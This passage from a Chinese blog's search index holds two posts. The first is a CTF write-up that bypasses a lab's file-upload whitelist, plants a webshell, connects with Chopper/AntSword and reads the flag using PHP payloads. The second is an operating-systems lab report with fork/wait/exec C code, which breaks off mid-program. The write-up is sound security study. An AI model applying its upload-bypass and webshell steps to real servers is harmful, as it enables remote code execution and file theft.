            <tag> web </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BabyUpload</title>
      <link href="/2023/11/18/BabyUpload/"/>
      <url>/2023/11/18/BabyUpload/</url>
      
        <content type="html"><![CDATA[<h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><p><img src="https://s2.loli.net/2023/11/16/w9uBm7OKldLbPYi.png" alt="image-20231116233238235"></p><p>.hatcess 上传不了</p><p>php也上传不了</p><p>试一下压缩的</p><p><img src="https://s2.loli.net/2023/11/16/A1MfY6OLNStjbPe.png" alt="image-20231116234407721"></p><p>这个上传成功了，然后呢，不知道了</p><p>通过报错信息发现他是apache的</p><p>上传.hccess 还是说太露骨了</p><p>试一下改文件类型</p><p><img src="https://s2.loli.net/2023/11/16/VzSui4OwghrfPv8.png" alt="image-20231116235521013"></p><p>ok也要修改为白名单内容</p><p><img src="https://s2.loli.net/2023/11/16/SfsolTYN95WqIX8.png" alt="image-20231116235554874"></p><p>cmd.jpg也上传成功</p><p>注意路径 网页时html</p><p>故这个文件的路径为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4e3c8094-e2af-484c-8d36-f8cb60f24f42.node4.buuoj.cn:81/upload/0f2e3369b5d0f6a0e14d721550cbb108/cmd.jpg </span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/17/2ScyG8nQUjWaAeP.png" alt="image-20231117000445226"></p><p>为啥这样也不行，哭死</p><p>知道原因了。。。</p><p><img src="https://s2.loli.net/2023/11/18/noeUfLb3NSVyiYF.png" alt="image-20231118230537733"></p><p><img src="https://s2.loli.net/2023/11/18/gQbh6oxyqPKG2jA.png" alt="image-20231118230609677"></p><p>连接成功</p><h2 id="1：连接菜刀"><a href="#1：连接菜刀" class="headerlink" title="1：连接菜刀"></a>1：连接菜刀</h2><p><img src="https://s2.loli.net/2023/11/18/D2yq4Y8W7XLelpN.png" alt="image-20231118230706764"></p><p><img src="https://s2.loli.net/2023/11/18/fGhE932USlzuMqQ.png" alt="image-20231118230900684"></p><p>返回数据仍为空 不知道为什么</p><p><img src="https://s2.loli.net/2023/11/18/S57yX8dWbxfiEea.png" alt="image-20231118231707767"></p><p>换成post试一下</p><p><img src="https://s2.loli.net/2023/11/18/4El7nbCyKUN5gsQ.png" alt="image-20231118231746925"></p><p>post连接成功了</p><p><img src="https://s2.loli.net/2023/11/18/XxFW8GEoDeRaASL.png" alt="image-20231118231835980"></p><p>成功连接，行吧，以后都用post</p><p><img src="https://s2.loli.net/2023/11/18/CBjUbJVwGIONkSY.png" alt="image-20231118232029820"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;16b5b232-f069-4a43-b70f-77cb4f4f0139&#125;</span><br></pre></td></tr></table></figure><h2 id="2：直接通过cmd命令找"><a href="#2：直接通过cmd命令找" class="headerlink" title="2：直接通过cmd命令找"></a>2：直接通过cmd命令找</h2><p>查看不能使用的function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ldpcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld</span><br></pre></td></tr></table></figure><p>var_dump可以</p><p>故</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=var_dump(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/18/UmBG9EN4FkdbxJh.png" alt="image-20231118232733921"></p><p>找到flag</p><p>读取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=var_dump(file_get_contents(&#x27;/flag&#x27;));</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/18/XDtQRYLNxmIOdSf.png" alt="image-20231118232906966"></p><p>成功</p><h2 id="错误总结："><a href="#错误总结：" class="headerlink" title="错误总结："></a>错误总结：</h2><h3 id="1-ht上传不了"><a href="#1-ht上传不了" class="headerlink" title="1:ht上传不了"></a>1:ht上传不了</h3><p>因为我bp抓包的文件类型没改</p><p>要改成图片的，因为这个是白名单显示</p><h3 id="2：为什么查看不了phpinfo（）"><a href="#2：为什么查看不了phpinfo（）" class="headerlink" title="2：为什么查看不了phpinfo（）"></a>2：为什么查看不了phpinfo（）</h3><p>因为文件内容错了</p><p>变量没有加‘cmd’</p><p>直接就是cmd了</p><h3 id="3：为什么蚂蚁连接不了"><a href="#3：为什么蚂蚁连接不了" class="headerlink" title="3：为什么蚂蚁连接不了"></a>3：为什么蚂蚁连接不了</h3><p>不知道，我一开始用的是get请求，就是连接不了，要改为post请求才行，就这样叭记住就行</p>]]></content>
      
      
      <categories>
          
          <category> Web每日一题 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统实验（二）</title>
      <link href="/2023/11/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/11/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="1-实验目标"><a href="#1-实验目标" class="headerlink" title="1 实验目标"></a><strong>1</strong> <strong>实验目标</strong></h2><p>1、理解进程的概念</p><p>2、掌握创建进程并能理解子进程和父进程的交互关系</p><p>3、掌握进程的状态转换</p><h2 id="2-实验工具"><a href="#2-实验工具" class="headerlink" title="2 实验工具"></a><strong>2</strong> <strong>实验工具</strong></h2><p>(1) 硬件环境: AMD Ryzen 7 5800H with Radeon Graphics</p><p>(2) 软件环境: VMware 16.0、Ubuntu 18.04.6</p><h2 id="3-实验内容"><a href="#3-实验内容" class="headerlink" title="3 实验内容"></a><strong>3</strong> <strong>实验内容</strong></h2><h4 id="实验步骤及实验结果"><a href="#实验步骤及实验结果" class="headerlink" title="实验步骤及实验结果"></a>实验步骤及实验结果</h4><p><strong>一、自定义操作系统并启动</strong></p><h5 id="1、用系统调用fork-函数实现子进程的创建，熟悉进程创建的执行过程。"><a href="#1、用系统调用fork-函数实现子进程的创建，熟悉进程创建的执行过程。" class="headerlink" title="1、用系统调用fork()函数实现子进程的创建，熟悉进程创建的执行过程。"></a>1、用系统调用fork()函数实现子进程的创建，熟悉进程创建的执行过程。</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello,world (pid:%d)\n&quot;</span>,(<span class="type">int</span>) getpid());</span><br><span class="line"><span class="type">int</span> rc=fork();</span><br><span class="line">       <span class="keyword">if</span>(rc&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;fork failed\n&quot;</span>); </span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(rc==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello,I am child (pid:%d)\n&quot;</span>,(<span class="type">int</span>) getpid());&#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello, I am Parent of %d (pid:%d)\n&quot;</span>,rc,(<span class="type">int</span>) getpid());&#125;&#125;</span><br></pre></td></tr></table></figure><p>​                               <img src="https://s2.loli.net/2023/11/12/dHsOmq9Q8AcD3Ey.png" alt="image-20231111234806303"></p><p>【思考题：分析并运行以下程序，运行结果截图，并说明程序结果是否唯一，为什么？】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">结果不唯一，因为他们是并发执行，输出的顺序不唯一，在父进程中,fork()函数返回子进程的PID（3939），所以程序打印&quot;hello, I am Parent of 3939 (pid:3938)&quot;</span><br><span class="line"></span><br><span class="line">在子进程中，fork函数返回的为0，所以打印的是“hello,I am child(pid:3939)”</span><br></pre></td></tr></table></figure><h5 id="2、用系统调用wait-函数对上述程序进行修改，实现父进程等待子进程执行完毕后再执行。"><a href="#2、用系统调用wait-函数对上述程序进行修改，实现父进程等待子进程执行完毕后再执行。" class="headerlink" title="2、用系统调用wait()函数对上述程序进行修改，实现父进程等待子进程执行完毕后再执行。"></a>2、用系统调用wait()函数对上述程序进行修改，实现父进程等待子进程执行完毕后再执行。</h5><p>【给出修改后的代码及说明，并分析运行结果】</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world (pid: %d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am child (pid: %d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        <span class="comment">// 等待子进程执行完毕</span></span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am Parent of %d (pid: %d)\n&quot;</span>, rc, (<span class="type">int</span>)getpid());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <img src="https://s2.loli.net/2023/11/12/fnP6asBwmydH32Q.png" alt="image-20231111234821836"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">运行结果和之前不同，之前是父进程和子进程是并发执行，运行结果不分前后</span><br><span class="line"></span><br><span class="line">加了wait（）之后一定是子进程先执行完毕 输出“hello,I am child”,然后父进程才结束执行</span><br></pre></td></tr></table></figure><h5 id="3、用系统调用exec类函数对上述程序进行修改，实现父进程等待子进程运行，子进程执行新的任务，例如查看当前进程等等。"><a href="#3、用系统调用exec类函数对上述程序进行修改，实现父进程等待子进程运行，子进程执行新的任务，例如查看当前进程等等。" class="headerlink" title="3、用系统调用exec类函数对上述程序进行修改，实现父进程等待子进程运行，子进程执行新的任务，例如查看当前进程等等。"></a>3、用系统调用exec类函数对上述程序进行修改，实现父进程等待子进程运行，子进程执行新的任务，例如查看当前进程等等。</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world (pid: %d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am child (pid: %d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查看当前进程</span></span><br><span class="line">        execlp(<span class="string">&quot;ps&quot;</span>, <span class="string">&quot;ps&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// exec函数执行失败</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;exec failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am Parent of %d (pid: %d)\n&quot;</span>, rc, (<span class="type">int</span>)getpid());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/12/MLwd2ufRBneYqFI.png" alt="image-20231111234838519"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在子进程里面添加execlp函数，使子进程执行ls命令</span><br><span class="line"></span><br><span class="line">子进程先输出“hello，I am child”语句</span><br><span class="line"></span><br><span class="line">当execlp执行成功是，会将子进程的所有代码改为执行命令的代码</span><br><span class="line"></span><br><span class="line">如果execlp执行失败，则会输出“exec failed”语句</span><br><span class="line"></span><br><span class="line">父进程仍使用wait函数等待子进程执行结束再输出“hello ，I am parent ”语句</span><br></pre></td></tr></table></figure><p>【给出修改后的代码及说明，并分析运行结果】</p><h5 id="4、编写程序，实现进程的管理功能。能够实现创建进程、查看正在运行的进程、切换某个进程、结束进程以及唤醒进程的功能。"><a href="#4、编写程序，实现进程的管理功能。能够实现创建进程、查看正在运行的进程、切换某个进程、结束进程以及唤醒进程的功能。" class="headerlink" title="4、编写程序，实现进程的管理功能。能够实现创建进程、查看正在运行的进程、切换某个进程、结束进程以及唤醒进程的功能。"></a>4、编写程序，实现进程的管理功能。能够实现创建进程、查看正在运行的进程、切换某个进程、结束进程以及唤醒进程的功能。</h5><p>设计思路：</p><p>编写一个进程结构体，结构体内有进程号，进程是否运行，然后创建功能函数，实现进程的创建，查看，切换，结束等</p><p>在main函数里通过while循环里添加switch语句判断用户选项，后进行函数调用，直至用户输入结束进程的选项</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义进程结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">pid_t</span> pid;      <span class="comment">// 进程ID</span></span><br><span class="line">    <span class="type">int</span> actpid;     <span class="comment">// 进程是否处于活动状态</span></span><br><span class="line">&#125; Process;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建进程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">createp</span><span class="params">(Process* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 子进程代码</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child p (pid: %d) has been created.\n&quot;</span>, getpid());</span><br><span class="line">        sleep(<span class="number">5</span>); <span class="comment">// 模拟子进程的工作</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child p (pid: %d) has finished its work.\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 父进程代码</span></span><br><span class="line">        p-&gt;pid = pid;</span><br><span class="line">        p-&gt;actpid = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Parent p (pid: %d) has created a child p (pid: %d).\n&quot;</span>, getpid(), pid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看正在运行的进程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">viewp</span><span class="params">(Process* p, <span class="type">int</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Running p:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[i].actpid) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Process %d (pid: %d) is running.\n&quot;</span>, i+<span class="number">1</span>, p[i].pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 切换进程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">switchp</span><span class="params">(Process* p, <span class="type">int</span> num, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">0</span> &amp;&amp; index &lt; num) &#123;</span><br><span class="line">        Process* target = &amp;p[index];</span><br><span class="line">        <span class="keyword">if</span> (target-&gt;actpid) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Switching to p %d (pid: %d).\n&quot;</span>, index+<span class="number">1</span>, target-&gt;pid);</span><br><span class="line">            waitpid(target-&gt;pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Process %d (pid: %d) has finished.\n&quot;</span>, index+<span class="number">1</span>, target-&gt;pid);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Process %d is not actpid.\n&quot;</span>, index+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid p index.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结束进程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">endp</span><span class="params">(Process* p, <span class="type">int</span> num, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">0</span> &amp;&amp; index &lt; num) &#123;</span><br><span class="line">        Process* target = &amp;p[index];</span><br><span class="line">        <span class="keyword">if</span> (target-&gt;actpid) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Ending p %d (pid: %d).\n&quot;</span>, index+<span class="number">1</span>, target-&gt;pid);</span><br><span class="line">            kill(target-&gt;pid, SIGTERM);</span><br><span class="line">            waitpid(target-&gt;pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">            target-&gt;actpid = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Process %d (pid: %d) has been ended.\n&quot;</span>, index+<span class="number">1</span>, target-&gt;pid);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Process %d is not actpid.\n&quot;</span>, index+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid p index.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 唤醒进程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">wakep</span><span class="params">(Process* p, <span class="type">int</span> num, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">0</span> &amp;&amp; index &lt; num) &#123;</span><br><span class="line">        Process* target = &amp;p[index];</span><br><span class="line">        <span class="keyword">if</span> (!target-&gt;actpid) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Waking up p %d.\n&quot;</span>, index+<span class="number">1</span>);</span><br><span class="line">            createp(target);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Process %d is already actpid.\n&quot;</span>, index+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid p index.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span 